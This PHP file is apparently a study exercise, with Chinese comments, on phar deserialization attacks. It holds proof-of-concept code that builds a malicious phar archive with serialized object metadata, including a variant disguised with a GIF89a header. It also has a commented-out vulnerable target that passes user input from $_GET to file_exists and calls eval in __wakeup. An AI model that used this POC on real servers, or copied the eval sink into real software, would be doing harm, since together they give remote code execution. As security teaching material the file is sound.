<?php

//第一部分，基本原理
// // 正常的PHP后台执行代码，注意需要使用file_exists函数触发
// class User{
//     var $name;
//     function __destruct()
//     {
//         echo $this->name;
//     }
// }
// $filename = 'phar://test.phar/test.txt';
// // $filename = $_GET['input'];
// file_exists($filename);

// 构造POC
class User{
    var $name;
    function __construct(){
        $this->name = 'phpinfo();';
    }
}
@unlink("test.phar");   //删除之前的phar
$phar = new Phar("test.phar");
$phar->startBuffering();
$phar->setStub("?php __HALT_COMPILER(); ");   //标识符，表明是phar文件类型
$o = new User();
$phar->setMetadata($o);   //会自动执行序列化操作
$phar->addFromString("test.txt","text");
$phar->stopBuffering();

// class User{
//     var $name;
// }
// $phar = new Phar("test.phar");
// $phar->startBuffering();
// $phar->setStub("GIF89a<?php __HALT_COMPILER();");   //文件头添加GIF89a
// $a = new User();
// $a->name = "phpinfo();";
// $phar->setMetadata($a);
// $phar->addFromString("test.txt","test");
// $phar->stopBuffering();


//第二部分，漏洞利用
// class User{
//     var $name;
//     function __wakeup()
//     {
//         @eval($this->name);
//     }
//     // function __destruct()
//     // {
//     //     echo $this->name;
//     // }
// }
// $filename = $_GET['filename'];
// file_exists($filename);